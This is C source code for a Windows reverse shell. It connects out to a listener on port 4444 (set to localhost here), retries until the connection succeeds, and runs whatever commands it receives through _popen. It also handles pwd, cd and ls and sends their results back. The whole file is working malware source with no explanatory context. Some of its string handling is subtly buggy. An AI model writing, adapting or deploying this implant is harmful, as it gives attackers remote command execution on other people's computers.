
#include <winsock2.h>
#include <windows.h>
#include <ws2tcpip.h>
#include <stdio.h>
//#include <iostream>
 
#pragma comment(lib, "Ws2_32.lib")
#define DEFAULT_BUFLEN 1024
char* pwd(){
	char* dir = (char*) malloc(sizeof(char)*512);
	GetCurrentDirectory(512,dir);
	return dir;
}
bool starts_with(char* string,char* what){
	if(strlen(what)>strlen(string))return false;
	while(*what!= '\0'){
		if(*what != *string)return false;
		what++;
		string++;
	}
	return true;
}
char* extract_second(char* string){
	while(*string != '\0' && *(string++) != ' ')string++;
	return string;
}
void RevShell(){
	WSADATA wsaver;
	WSAStartup(MAKEWORD(2,2),&wsaver);
	SOCKET tcpsock = socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);
	sockaddr_in addr;
	addr.sin_family = AF_INET;
	addr.sin_port = htons(4444);
	addr.sin_addr.s_addr = inet_addr("127.0.0.1");
	while(connect(tcpsock,(SOCKADDR*)&addr,sizeof(addr))==SOCKET_ERROR){
		//Keep retrying
	}
	if(1){
		//std::cout << "[+] Connected. " << std::endl;
		char command[DEFAULT_BUFLEN] = "";
		while(1){
			int Result = recv(tcpsock,command,DEFAULT_BUFLEN,0);
			if(Result == SOCKET_ERROR)
				while(connect(tcpsock,(SOCKADDR*)&addr,sizeof(addr))==SOCKET_ERROR){
					//Keep retrying
				}
			else if(strlen(command)){
				//std::cout << "Command: " << command << std::endl;
				char   psBuffer[4096*5];
				FILE   *pPipe;
				if(strcmp(command,"pwd") == 0){
					char* cmd_out = pwd();
					send(tcpsock,cmd_out,strlen(cmd_out),0);
					free(cmd_out);
				}
				else if(starts_with(command,"cd")){
					SetCurrentDirectory(extract_second(command));
				}
				else if(strcmp(command,"ls")==0){
					WIN32_FIND_DATAA fdata;
					HANDLE f_res = FindFirstFileA("*",&fdata);
					char* fname = (char*) malloc(sizeof(char)*strlen(fdata.cFileName)+sizeof(char)*2);
					sprintf(fname,"%s\n",fdata.cFileName);
					send(tcpsock,fname,strlen(fname),0);
					free(fname);
					while(FindNextFileA(f_res,&fdata)){
						char* fname = (char*) malloc(sizeof(char)*strlen(fdata.cFileName)+sizeof(char)*2);
						sprintf(fname,"%s\n",fdata.cFileName);
						send(tcpsock,fname,strlen(fname),0);
						free(fname);
					};
				}
				else if((pPipe = _popen( command, "rt" )) != false){
					fgets(psBuffer, 4096*5, pPipe);
					//strcat(psBuffer,"\n");
					if(send(tcpsock,psBuffer,strlen(psBuffer),0) == SOCKET_ERROR)
						while(connect(tcpsock,(SOCKADDR*)&addr,sizeof(addr))==SOCKET_ERROR){
							//Keep retrying
					};
					memset(psBuffer,0,4096*5);
				}
			}
			memset(command,0,sizeof(command));
		}
		//system("pause");
	}
	closesocket(tcpsock);
	WSACleanup();
	exit(0);
}
int main(){
	HWND stealth;
	AllocConsole();
	stealth=FindWindow("ConsoleWindowClass",NULL);
	ShowWindow(stealth,SW_SHOWNORMAL);
	RevShell();
	return 0;
}